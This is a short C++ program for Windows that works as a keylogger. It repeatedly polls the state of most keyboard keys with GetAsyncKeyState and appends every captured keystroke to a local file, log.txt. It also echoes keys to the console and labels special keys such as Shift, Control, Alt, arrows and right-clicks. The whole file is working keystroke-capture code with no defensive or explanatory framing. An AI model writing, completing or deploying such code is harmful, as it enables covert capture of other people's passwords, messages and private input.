#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>

using namespace std;

bool extraKey(int key);
void LOG(string key);

int main() {
	int key;
	while (true) {
		for (key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (extraKey(key) == false) {
					fstream logFile;
					logFile.open("log.txt", fstream::app);
					if (logFile.is_open()) {
						cout << char(key) << " ";
						logFile << char(key) << " ";
						logFile.close();
					}
				}
			}
		}
	}
}

void LOG(string key) {
	fstream logFile;
	logFile.open("log.txt", fstream::app);
	if (logFile.is_open()) {
		logFile << key;
		logFile.close();
	}
}

bool extraKey(int key) {
		switch (key) {
		case VK_SPACE:
			cout << " ";
			LOG(" ");
			return true;
		case VK_RETURN:
			cout << "\n";
			LOG("\n");
			return true;
		case '¾':
			cout << "." << " ";
			LOG(".");
			return true;
		case VK_SHIFT:
			cout << "#SHIFT#" << " ";
			LOG("#SHIFT#");
			return true;
		case VK_BACK:
			cout << "\b" << " ";
			LOG("\b");
			return true;
		case VK_RBUTTON:
			cout << "#R_CLICK#" << " ";
			LOG("#R_CLICK#");
			return true;
		case VK_CAPITAL:
			cout << "#CAPS_LOCK#" << " ";
			LOG("#CAPS_LCOK");
			return true;
		case VK_TAB:
			cout << "#TAB" << " ";
			LOG("#TAB");
			return true;
		case VK_UP:
			cout << "#UP" << " ";
			LOG("#UP_ARROW_KEY");
			return true;
		case VK_DOWN:
			cout << "#DOWN" << " ";
			LOG("#DOWN_ARROW_KEY");
			return true;
		case VK_LEFT:
			cout << "#LEFT" << " ";
			LOG("#LEFT_ARROW_KEY");
			return true;
		case VK_RIGHT:
			cout << "#RIGHT" << " ";
			LOG("#RIGHT_ARROW_KEY");
			return true;
		case VK_CONTROL:
			cout << "#CONTROL" << " ";
			LOG("#CONTROL");
			return true;
		case VK_MENU:
			cout << "#ALT" << " ";
			LOG("#ALT");
			return true;
		default:
			return false;
		}
	}
